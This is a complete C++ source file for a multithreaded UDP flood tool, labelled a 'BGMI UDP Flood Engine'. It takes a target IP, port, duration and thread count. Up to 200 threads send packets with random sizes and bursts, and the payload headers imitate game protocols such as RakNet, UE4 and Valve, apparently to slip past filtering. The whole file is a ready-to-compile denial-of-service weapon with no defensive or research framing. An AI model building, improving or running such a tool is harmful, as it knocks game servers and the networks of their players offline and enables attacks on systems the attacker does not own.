// flooder.cpp — BGMI UDP Flood Engine
// Usage: ./flooder <ip> <port> <duration_sec> <threads>
// Compile: g++ -O2 -o flooder flooder.cpp -lpthread

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <cstdint>
#include <ctime>
#include <thread>
#include <atomic>
#include <vector>
#include <random>
#include <chrono>

#ifdef _WIN32
  #include <winsock2.h>
  #pragma comment(lib, "ws2_32.lib")
  typedef int socklen_t;
#else
  #include <sys/socket.h>
  #include <netinet/in.h>
  #include <arpa/inet.h>
  #include <unistd.h>
  #define closesocket close
#endif

static std::atomic<bool> g_stop{false};
static std::atomic<uint64_t> g_packets{0};

// ── PAYLOAD PATTERNS (BGMI/UE4/RakNet mimic) ─────────────────────
static const uint8_t PATTERNS[][8] = {
    {0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},  // RakNet
    {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},  // UE4
    {0x13, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00},  // Epic
    {0xff, 0xff, 0xff, 0xff, 0x54, 0x53, 0x6f, 0x75},  // Valve
    {0xfe, 0xfd, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},  // GameSpy
};
static const int N_PATTERNS = sizeof(PATTERNS) / sizeof(PATTERNS[0]);

static const int SIZES[] = {64, 128, 256, 512, 512, 1024, 1400};
static const int N_SIZES = sizeof(SIZES) / sizeof(SIZES[0]);

void fill_payload(uint8_t* buf, int size, std::mt19937& rng) {
    int pat_idx = rng() % N_PATTERNS;
    memcpy(buf, PATTERNS[pat_idx], 8);
    // rest random
    for (int i = 8; i < size; i++) {
        buf[i] = (uint8_t)(rng() & 0xFF);
    }
}

// ── WORKER THREAD ─────────────────────────────────────────────────
void flood_worker(const char* ip, int port, int worker_id) {
    std::mt19937 rng(std::random_device{}() ^ (worker_id * 0xDEADBEEF));

    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) return;

    // Increase socket send buffer
    int sndbuf = 1024 * 1024;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, (char*)&sndbuf, sizeof(sndbuf));

    struct sockaddr_in target{};
    target.sin_family      = AF_INET;
    target.sin_port        = htons((uint16_t)port);
    target.sin_addr.s_addr = inet_addr(ip);

    uint8_t buf[1500];

    while (!g_stop.load(std::memory_order_relaxed)) {
        int size = SIZES[rng() % N_SIZES];
        fill_payload(buf, size, rng);

        sendto(sock, (char*)buf, size, 0,
               (struct sockaddr*)&target, sizeof(target));
        g_packets.fetch_add(1, std::memory_order_relaxed);

        // micro burst — 30% chance
        if ((rng() & 0xFF) < 76) {
            int burst = 5 + (rng() % 15);
            for (int b = 0; b < burst; b++) {
                int sz2 = SIZES[rng() % 3]; // smaller packets in burst
                fill_payload(buf, sz2, rng);
                sendto(sock, (char*)buf, sz2, 0,
                       (struct sockaddr*)&target, sizeof(target));
                g_packets.fetch_add(1, std::memory_order_relaxed);
            }
        }
    }

    closesocket(sock);
}

int main(int argc, char* argv[]) {
    if (argc < 5) {
        fprintf(stderr, "Usage: %s <ip> <port> <duration_sec> <threads>\n", argv[0]);
        return 1;
    }

    const char* ip  = argv[1];
    int port        = atoi(argv[2]);
    int duration    = atoi(argv[3]);
    int n_threads   = atoi(argv[4]);

    if (port < 1 || port > 65535) {
        fprintf(stderr, "[!] Invalid port\n");
        return 1;
    }
    if (duration < 1 || duration > 3600) duration = 120;
    if (n_threads < 1)  n_threads = 1;
    if (n_threads > 200) n_threads = 200;

#ifdef _WIN32
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);
#endif

    fprintf(stderr, "[*] Target: %s:%d | Duration: %ds | Threads: %d\n",
            ip, port, duration, n_threads);

    g_stop.store(false);
    g_packets.store(0);

    std::vector<std::thread> workers;
    workers.reserve(n_threads);
    for (int i = 0; i < n_threads; i++) {
        workers.emplace_back(flood_worker, ip, port, i);
    }

    // Wait duration, print PPS every 5s
    auto start = std::chrono::steady_clock::now();
    uint64_t last_pkt = 0;
    int elapsed = 0;

    while (elapsed < duration) {
        std::this_thread::sleep_for(std::chrono::seconds(5));
        elapsed += 5;
        uint64_t cur = g_packets.load();
        uint64_t pps = (cur - last_pkt) / 5;
        last_pkt = cur;
        fprintf(stderr, "[~] %ds/%ds | PPS: %llu | Total: %llu\n",
                elapsed, duration, (unsigned long long)pps, (unsigned long long)cur);
        if (elapsed >= duration) break;
    }

    g_stop.store(true);
    for (auto& t : workers) t.join();

    fprintf(stdout, "%llu\n", (unsigned long long)g_packets.load());

#ifdef _WIN32
    WSACleanup();
#endif
    return 0;
}
